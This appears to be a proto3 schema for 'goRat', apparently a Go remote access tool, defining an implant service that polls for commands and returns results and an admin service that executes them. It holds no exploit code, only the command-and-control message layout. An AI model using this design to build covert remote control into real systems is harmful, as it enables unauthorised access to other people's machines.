syntax = "proto3";
package goRat;
option go_package = ".";

service Embed {
    rpc GetCommand (Empty) returns (Command);
    rpc SendResult (Command) returns (Empty);
}

service Admin {
    rpc ExecuteCommand (Command) returns (Command);
}

message Command {
    string Input = 1;
    string Output = 2;
}
// Empty message to use in place of null
message Empty {
}